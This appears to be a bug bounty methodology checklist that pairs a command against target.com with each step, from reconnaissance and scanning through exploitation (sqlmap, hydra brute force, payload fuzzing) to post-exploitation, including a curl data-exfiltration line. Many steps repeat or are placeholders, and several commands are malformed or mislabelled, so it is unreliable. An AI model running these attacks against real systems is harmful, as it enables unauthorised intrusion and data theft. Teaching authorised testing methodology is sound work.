# Bug Bounty Methodology

## Reconnaissance

1. **WHOIS Lookup**
    ```bash
    whois target.com
    ```
    - **Action:** Retrieves WHOIS information for `target.com`, including registration details and contact information.

2. **Reverse IP Lookup**
    ```bash
    reverseip -d target.com
    ```
    - **Action:** Finds other domains hosted on the same IP address as `target.com`.

3. **DNS Enumeration**
    ```bash
    dnsenum target.com
    ```
    - **Action:** Performs DNS enumeration to gather information about DNS records for `target.com`.

4. **Subdomain Enumeration**
    ```bash
    sublist3r -d target.com
    ```
    - **Action:** Identifies subdomains of `target.com`.

5. **Port Scanning**
    ```bash
    nmap -p- target.com
    ```
    - **Action:** Scans all ports on `target.com` to find open ports.

6. **Service Detection**
    ```bash
    nmap -sV -p- target.com
    ```
    - **Action:** Detects versions of services running on open ports of `target.com`.

7. **Banner Grabbing**
    ```bash
    nmap -sV --script=banner -p80,443 target.com
    ```
    - **Action:** Grabs service banners on `target.com` to identify software versions.

8. **Vulnerability Scanning**
    ```bash
    nmap --script vuln -p- target.com
    ```
    - **Action:** Uses Nmap scripts to scan for known vulnerabilities on `target.com`.

9. **Web Server Fingerprinting**
    ```bash
    whatweb -v target.com
    ```
    - **Action:** Identifies technologies used by the web server of `target.com`.

10. **Technology Stacks Identification**
    ```bash
    wappalyzer -u https://target.com
    ```
    - **Action:** Detects the technologies and frameworks used by `target.com`.

11. **SSL/TLS Configuration Testing**
    ```bash
    testssl.sh target.com
    ```
    - **Action:** Checks SSL/TLS configurations and vulnerabilities on `target.com`.

## Scanning

12. **Content Discovery**
    ```bash
    gobuster dir -u https://target.com -w wordlist.txt
    ```
    - **Action:** Performs content discovery on `https://target.com` using `gobuster`.

13. **Directory and File Enumeration**
    ```bash
    dirbuster -u https://target.com -w wordlist.txt
    ```
    - **Action:** Uses `dirbuster` to discover directories and files on `https://target.com`.

14. **Open Redirect Testing**
    ```bash
    gospider -S https://target.com -o open_redirects.txt
    ```
    - **Action:** Scans `https://target.com` for open redirects and saves results to `open_redirects.txt`.

15. **Parameter Enumeration**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/parameters.txt
    ```
    - **Action:** Enumerates parameters on `https://target.com` using `ffuf`.

16. **HTTP Method Enumeration**
    ```bash
    http-methods -u https://target.com
    ```
    - **Action:** Identifies allowed HTTP methods on `https://target.com`.

17. **Subdomain Enumeration with Sublist3r**
    ```bash
    sublist3r -d target.com -o subdomains.txt
    ```
    - **Action:** Enumerates subdomains of `target.com` and saves the results to `subdomains.txt`.

18. **Virtual Host Enumeration**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/vhosts.txt
    ```
    - **Action:** Enumerates virtual hosts on `https://target.com` using `ffuf`.

19. **Port Scanning with Nmap**
    ```bash
    nmap -p- target.com
    ```
    - **Action:** Scans all ports on `target.com` to find open ports.

20. **Port Scanning with Masscan**
    ```bash
    masscan -p1-65535 target.com
    ```
    - **Action:** Uses `masscan` to perform a comprehensive port scan on `target.com`.

21. **Service Version Detection**
    ```bash
    nmap -sV -p- target.com
    ```
    - **Action:** Detects versions of services running on open ports of `target.com`.

## Enumeration

22. **User Enumeration**
    ```bash
    theHarvester -d target.com -b google -l 500
    ```
    - **Action:** Uses `theHarvester` to enumerate email addresses associated with `target.com`.

23. **API Endpoint Enumeration**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to discover and enumerate API endpoints on `target.com`.

24. **Email Verification**
    ```bash
    emailverify -e email@target.com
    ```
    - **Action:** Verifies the validity of email addresses associated with `target.com`.

25. **Subdomain Takeover Testing**
    ```bash
    subjack -w subdomains.txt -t 20 -o subjack_results.txt
    ```
    - **Action:** Checks for subdomain takeover vulnerabilities and saves results to `subjack_results.txt`.

26. **Open Redirect Testing with Gospider**
    ```bash
    gospider -S https://target.com -o open_redirects.txt
    ```
    - **Action:** Scans `https://target.com` for open redirects and saves results to `open_redirects.txt`.

27. **CORS Testing**
    ```bash
    corsy -u https://target.com
    ```
    - **Action:** Uses `corsy` to test for Cross-Origin Resource Sharing (CORS) misconfigurations.

28. **SSRF Testing**
    ```bash
    ssrfmap -u https://target.com
    ```
    - **Action:** Uses `ssrfmap` to test for Server-Side Request Forgery (SSRF) vulnerabilities.

29. **Clickjacking Testing**
    ```bash
    clickjacking -u https://target.com
    ```
    - **Action:** Tests for clickjacking vulnerabilities on `https://target.com`.

30. **Clickjacking Testing with Burp Suite**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for clickjacking vulnerabilities on `target.com`.

31. **Content Security Policy (CSP) Testing**
    ```bash
    csp-scan -u https://target.com
    ```
    - **Action:** Tests for Content Security Policy (CSP) misconfigurations on `https://target.com`.

32. **Sensitive Data Exposure Testing**
    ```bash
    feroxbuster -u https://target.com -w wordlist.txt
    ```
    - **Action:** Uses `feroxbuster` to find sensitive data on `https://target.com`.

33. **XSS and SQL Injection Testing with XSStrike**
    ```bash
    xsstrike -u https://target.com
    ```
    - **Action:** Uses `xsstrike` to test for XSS and SQL injection vulnerabilities on `https://target.com`.

34. **Testing for Insecure HTTP Methods**
    ```bash
    http-methods -u https://target.com
    ```
    - **Action:** Checks for insecure HTTP methods on `https://target.com`.

35. **SSRF Testing with Payloads**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/ssrf.txt
    ```
    - **Action:** Uses `ffuf` with a list of SSRF payloads to test for SSRF vulnerabilities.

36. **Local File Inclusion (LFI) Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/lfi.txt
    ```
    - **Action:** Uses `ffuf` with a list of LFI payloads to test for Local File Inclusion vulnerabilities.

37. **Remote File Inclusion (RFI) Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/rfi.txt
    ```
    - **Action:** Uses `ffuf` with a list of RFI payloads to test for Remote File Inclusion vulnerabilities.

38. **Server-Side Template Injection (SSTI) Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/ssti.txt
    ```
    - **Action:** Uses `ffuf` with a list of SSTI payloads to test for Server-Side Template Injection vulnerabilities.

39. **Server-Side JavaScript Injection (SSJI) Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/ssji.txt
    ```
    - **Action:** Uses `ffuf` with a list of Server-Side JavaScript Injection (SSJI) payloads to test for SSJI vulnerabilities.

40. **Open Port Scanning**
    ```bash
    nmap -p- -T4 target.com
    ```
    - **Action:** Scans all ports on `target.com` to find open ports.

41. **Version Detection**
    ```bash
    nmap -sV -p- target.com
    ```
    - **Action:** Detects versions of services running on open ports of `target.com`.

42. **HTTP Header Inspection**
    ```bash
    curl -I https://target.com
    ```
    - **Action:** Inspects HTTP headers returned by `https://target.com`.

43. **HTTPS Security Testing**
    ```bash
    sslyze https://target.com
    ```
    - **Action:** Tests SSL/TLS security configurations of `https://target.com`.

## Exploitation

44. **SQL Injection Testing**
    ```bash
    sqlmap -u https://target.com/vulnerable-endpoint --dbs
    ```
    - **Action:** Uses `sqlmap` to test for SQL injection vulnerabilities and enumerate databases.

45. **XSS Testing**
    ```bash
    xsstrike -u https://target.com/vulnerable-endpoint
    ```
    - **Action:** Uses `xsstrike` to test for Cross-Site Scripting (XSS) vulnerabilities.

46. **Command Injection Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/command_injection.txt
    ```
    - **Action:** Tests for command injection vulnerabilities using `ffuf`.

47. **CSRF Testing**
    ```bash
    csrf_poc -u https://target.com/vulnerable-endpoint
    ```
    - **Action:** Checks for Cross-Site Request Forgery (CSRF) vulnerabilities.

48. **Local File Inclusion (LFI) Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for Local File Inclusion vulnerabilities.

49. **Remote File Inclusion (RFI) Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for Remote File Inclusion vulnerabilities.

50. **Server-Side Template Injection (SSTI) Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for Server-Side Template Injection vulnerabilities.

51. **Server-Side JavaScript Injection (SSJI) Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for Server-Side JavaScript Injection vulnerabilities.

52. **Sensitive Data Exposure Testing**
    ```bash
    feroxbuster -u https://target.com -w wordlist.txt
    ```
    - **Action:** Uses `feroxbuster` to find sensitive data that may be exposed on `https://target.com`.

53. **Open Redirect Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/open_redirect.txt
    ```
    - **Action:** Tests for open redirect vulnerabilities using `ffuf`.

54. **Clickjacking Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for clickjacking vulnerabilities.

55. **HTTP Response Splitting Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/http_response_splitting.txt
    ```
    - **Action:** Tests for HTTP Response Splitting vulnerabilities using `ffuf`.

56. **Clickjacking Testing with Payloads**
    ```bash
    burpsuite
    ```
    - **Action:** Tests for clickjacking vulnerabilities using Burp Suite with different payloads.

57. **Directory Traversal Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/directory_traversal.txt
    ```
    - **Action:** Tests for directory traversal vulnerabilities using `ffuf`.

58. **Open Redirect Testing with Payloads**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/open_redirect.txt
    ```
    - **Action:** Uses `ffuf` to test for open redirects with a list of payloads.

59. **Session Fixation Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Tests for session fixation vulnerabilities using Burp Suite.

60. **Session Management Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for session management issues.

61. **JWT Manipulation Testing**
    ```bash
    jwt_tool -i https://target.com/vulnerable-endpoint
    ```
    - **Action:** Tests for vulnerabilities in JSON Web Tokens (JWT) on `https://target.com`.

62. **Brute Force Testing**
    ```bash
    hydra -L usernames.txt -P passwords.txt https://target.com
    ```
    - **Action:** Performs brute-force attacks using `hydra` with a list of usernames and passwords.

63. **API Testing**
    ```bash
    postman
    ```
    - **Action:** Uses Postman to test API endpoints for vulnerabilities.

64. **File Upload Vulnerability Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for file upload vulnerabilities.

65. **Open Redirect Testing with Burp Suite**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for open redirects.

66. **XML External Entity (XXE) Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/xxe.txt
    ```
    - **Action:** Tests for XML External Entity (XXE) vulnerabilities.

67. **Cross-Site Request Forgery (CSRF) Testing**
    ```bash
    csrf_poc -u https://target.com/vulnerable-endpoint
    ```
    - **Action:** Uses `csrf_poc` to test for CSRF vulnerabilities.

68. **Server-Side Request Forgery (SSRF) Testing**
    ```bash
    ssrfmap -u https://target.com
    ```
    - **Action:** Uses `ssrfmap` to check for SSRF vulnerabilities.

69. **Broken Authentication Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for broken authentication vulnerabilities.

70. **Broken Access Control Testing**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite to test for broken access control vulnerabilities.

## Post-Exploitation

71. **Privilege Escalation**
    ```bash
    nmap --script priv esc -p- target.com
    ```
    - **Action:** Checks for privilege escalation vulnerabilities on `target.com`.

72. **Data Exfiltration**
    ```bash
    curl -X POST -d @data.txt https://target.com/exfiltrate
    ```
    - **Action:** Exfiltrates data from `target.com` to a remote server.

73. **Network Mapping**
    ```bash
    nmap -sP target.com
    ```
    - **Action:** Maps the network to find other hosts connected to `target.com`.

74. **SSRF with Payloads**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/ssrf.txt
    ```
    - **Action:** Uses `ffuf` with a list of SSRF payloads to test for SSRF vulnerabilities.

75. **Email Enumeration**
    ```bash
    theHarvester -d target.com -b google -l 500
    ```
    - **Action:** Uses `theHarvester` to enumerate email addresses associated with `target.com`.

76. **Email Verification**
    ```bash
    emailverify -e email@target.com
    ```
    - **Action:** Verifies the validity of email addresses associated with `target.com`.

77. **Open Port Scanning with Masscan**
    ```bash
    masscan -p1-65535 target.com
    ```
    - **Action:** Uses `masscan` to perform an open port scan on `target.com`.

78. **Banner Grabbing**
    ```bash
    nmap -sV --script=banner -p80,443 target.com
    ```
    - **Action:** Grabs service banners on `target.com` to identify software versions and potential vulnerabilities.

79. **SMTP Relay Testing**
    ```bash
    smtp-user-enum -M VRFY -u usernames.txt -t target.com
    ```
    - **Action:** Tests for SMTP relay vulnerabilities on `target.com`.

80. **Web Application Vulnerability Scanning**
    ```bash
    burpsuite
    ```
    - **Action:** Uses Burp Suite for comprehensive web application vulnerability scanning.

81. **Cookie Security Testing**
    ```bash
    cookie-scan -u https://target.com
    ```
    - **Action:** Tests the security of cookies used by `https://target.com`.

82. **Log Injection Testing**
    ```bash
    ffuf -u https://target.com/FUZZ -w payloads/log_injection.txt
    ```
    - **Action:** Uses `ffuf` with a list of log injection payloads to test for log injection vulnerabilities.

83. **API Endpoints Testing**
    ```bash
    postman
    ```
    - **Action:** Uses Postman for testing API endpoints on `https://target.com`.

84. **Web Server Configuration Testing**
    ```bash
    nmap --script http-config -p80,443 target.com
    ```
    - **Action:** Tests the configuration of the web server on `target.com` using Nmap scripts.
